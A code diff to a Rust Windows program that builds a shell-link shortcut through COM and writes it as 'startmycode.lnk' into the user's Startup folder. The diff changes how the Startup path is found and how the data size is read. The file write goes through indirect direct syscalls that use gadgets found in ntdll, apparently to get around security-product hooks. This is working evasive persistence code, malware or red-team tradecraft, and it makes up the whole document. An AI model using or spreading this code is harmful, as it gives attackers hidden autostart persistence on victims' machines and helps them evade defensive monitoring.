@@ -9,13 +9,14 @@ mod syscalls;
 
 use std::ptr::null_mut;
 use std::ffi::c_void;
-use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
+use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK, MAX_PATH};
 use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
 use windows_sys::Win32::System::Com::{
     CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
     IStream,
 };
-use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock, GlobalSize};
+use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
+use windows_sys::Win32::UI::Shell::{SHGetSpecialFolderPathW, CSIDL_STARTUP};
 use windows_sys::core::GUID;
 
 // Define missing constants and functions
@@ -26,6 +27,22 @@ const CLSID_ShellLink: GUID = GUID {
     data4: [0x8F, 0x1C, 0x00, 0x80, 0xC7, 0x44, 0x13, 0x78],
 };
 
+#[repr(C)]
+struct STATSTG {
+    pwcsName: *mut u16,
+    r#type: u32,
+    cbSize: u64,
+    mtime: u64,
+    atime: u64,
+    ctime: u64,
+    grfMode: u32,
+    grfLocksSupported: u32,
+    clsid: GUID,
+    grfState: u32,
+    reserved: u32,
+}
+
+#[link(name = "ole32")]
 extern "system" {
     fn CreateStreamOnHGlobal(hglobal: *mut c_void, fdeleteonrelease: i32, ppstm: *mut *mut IStream) -> i32;
     fn GetHGlobalFromStream(pstm: *mut IStream, phglobal: *mut *mut c_void) -> i32;
@@ -76,6 +93,24 @@ struct IPersistStreamVtbl {
     GetSizeMax: usize,
 }
 
+#[repr(C)]
+struct IStreamVtbl {
+    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
+    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
+    Release: unsafe extern "system" fn(*mut c_void) -> u32,
+    Read: usize,
+    Write: usize,
+    Seek: usize,
+    SetSize: usize,
+    CopyTo: usize,
+    Commit: usize,
+    Revert: usize,
+    LockRegion: usize,
+    UnlockRegion: usize,
+    Stat: unsafe extern "system" fn(*mut c_void, *mut STATSTG, u32) -> i32,
+    Clone: usize,
+}
+
 const IID_IPersistStream: GUID = GUID {
     data1: 0x00000109,
     data2: 0x0000,
@@ -112,9 +147,11 @@ const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
 const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
 const SYNCHRONIZE: u32 = 0x00100000;
 
-fn to_nt_path(path: &str) -> Vec<u16> {
+fn to_nt_path(path_wide: &[u16]) -> Vec<u16> {
     let mut nt_path = "\\??\\".encode_utf16().collect::<Vec<u16>>();
-    nt_path.extend(path.encode_utf16());
+    // Find the actual length (before null terminator)
+    let len = path_wide.iter().position(|&c| c == 0).unwrap_or(path_wide.len());
+    nt_path.extend_from_slice(&path_wide[..len]);
     nt_path.push(0);
     nt_path
 }
@@ -140,7 +177,13 @@ fn main() {
         let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
         let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");
 
-        // 1. Generate LNK content using COM
+        // 1. Resolve Startup folder path correctly
+        let mut startup_path = [0u16; MAX_PATH as usize];
+        if SHGetSpecialFolderPathW(0, startup_path.as_mut_ptr(), CSIDL_STARTUP as i32, 0) == 0 {
+            return;
+        }
+
+        // 2. Generate LNK content using COM
         CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);
 
         let mut shell_link_ptr: *mut c_void = null_mut();
@@ -161,73 +204,78 @@ fn main() {
         let mut stream: *mut IStream = null_mut();
         if res == S_OK {
             let persist_stream_vtbl = *(persist_stream_ptr as *mut *mut IPersistStreamVtbl);
-            CreateStreamOnHGlobal(null_mut(), 1, &mut stream);
+            if CreateStreamOnHGlobal(null_mut(), 1, &mut stream) == S_OK {
+                let res = ((*persist_stream_vtbl).Save)(persist_stream_ptr, stream, 1);
+                if res == S_OK {
+                    let stream_vtbl = *(stream as *mut *mut IStreamVtbl);
+                    let mut stat = std::mem::zeroed::<STATSTG>();
+                    if ((*stream_vtbl).Stat)(stream as *mut _, &mut stat, 1) == S_OK {
+                        let mut hglobal: *mut c_void = null_mut();
+                        GetHGlobalFromStream(stream, &mut hglobal);
 
-            let res = ((*persist_stream_vtbl).Save)(persist_stream_ptr, stream, 1);
-            if res == S_OK {
-                let mut hglobal: *mut c_void = null_mut();
-                GetHGlobalFromStream(stream, &mut hglobal);
+                        let data_ptr = GlobalLock(hglobal);
+                        if !data_ptr.is_null() {
+                            // Prepare target file path
+                            let mut path_str = String::from_utf16_lossy(&startup_path);
+                            // Clean up trailing nulls if any
+                            if let Some(pos) = path_str.find('\0') {
+                                path_str.truncate(pos);
+                            }
+                            let full_path = format!("{}\\{}", path_str.trim_end_matches('\\'), "startmycode.lnk");
+                            let nt_startup_path = to_nt_path(&full_path.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>());
+                            let unicode_startup = create_unicode_string(&nt_startup_path);
 
-                let size = GlobalSize(hglobal);
-                let data_ptr = GlobalLock(hglobal);
+                            let mut out_handle: HANDLE = 0;
+                            let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
+                            let mut obj_attr = OBJECT_ATTRIBUTES {
+                                Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
+                                RootDirectory: 0,
+                                ObjectName: &unicode_startup,
+                                Attributes: OBJ_CASE_INSENSITIVE,
+                                SecurityDescriptor: null_mut(),
+                                SecurityQualityOfService: null_mut(),
+                            };
 
-                if !data_ptr.is_null() {
-                    // 2. Resolve Startup folder path
-                    if let Ok(appdata) = std::env::var("APPDATA") {
-                        let startup_file = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startmycode.lnk", appdata);
-                        let nt_startup_path = to_nt_path(&startup_file);
-                        let unicode_startup = create_unicode_string(&nt_startup_path);
-
-                        let mut out_handle: HANDLE = 0;
-                        let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
-                        let mut obj_attr = OBJECT_ATTRIBUTES {
-                            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
-                            RootDirectory: 0,
-                            ObjectName: &unicode_startup,
-                            Attributes: OBJ_CASE_INSENSITIVE,
-                            SecurityDescriptor: null_mut(),
-                            SecurityQualityOfService: null_mut(),
-                        };
-
-                        // 3. Create the .lnk file using direct syscall
-                        let status = crate::syscall!(
-                            nt_create_file_ssn,
-                            syscall_gadget,
-                            jmp_rbx_gadget,
-                            &mut out_handle as *mut _ as usize,
-                            (GENERIC_WRITE | SYNCHRONIZE) as usize,
-                            &mut obj_attr as *mut _ as usize,
-                            &mut io_status as *mut _ as usize,
-                            0,
-                            FILE_ATTRIBUTE_NORMAL as usize,
-                            0,
-                            FILE_OVERWRITE_IF as usize,
-                            (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
-                            0,
-                            0
-                        );
-
-                        if status == 0 {
-                            let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
-                            // 4. Write the content using direct syscall
-                            crate::syscall!(
-                                nt_write_file_ssn,
+                            // 3. Create the .lnk file using direct syscall
+                            let status = crate::syscall!(
+                                nt_create_file_ssn,
                                 syscall_gadget,
                                 jmp_rbx_gadget,
-                                out_handle as usize,
+                                &mut out_handle as *mut _ as usize,
+                                (GENERIC_WRITE | SYNCHRONIZE) as usize,
+                                &mut obj_attr as *mut _ as usize,
+                                &mut io_status as *mut _ as usize,
                                 0,
+                                FILE_ATTRIBUTE_NORMAL as usize,
                                 0,
-                                0,
-                                &mut write_io_status as *mut _ as usize,
-                                data_ptr as usize,
-                                size as usize,
+                                FILE_OVERWRITE_IF as usize,
+                                (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
                                 0,
                                 0
                             );
-                            crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
+
+                            if status == 0 {
+                                let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
+                                // 4. Write the content using direct syscall
+                                crate::syscall!(
+                                    nt_write_file_ssn,
+                                    syscall_gadget,
+                                    jmp_rbx_gadget,
+                                    out_handle as usize,
+                                    0,
+                                    0,
+                                    0,
+                                    &mut write_io_status as *mut _ as usize,
+                                    data_ptr as usize,
+                                    stat.cbSize as usize,
+                                    0,
+                                    0
+                                );
+                                crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
+                            }
+                            GlobalUnlock(hglobal);
                         }
                     }
-                    GlobalUnlock(hglobal);
                 }
             }
         }
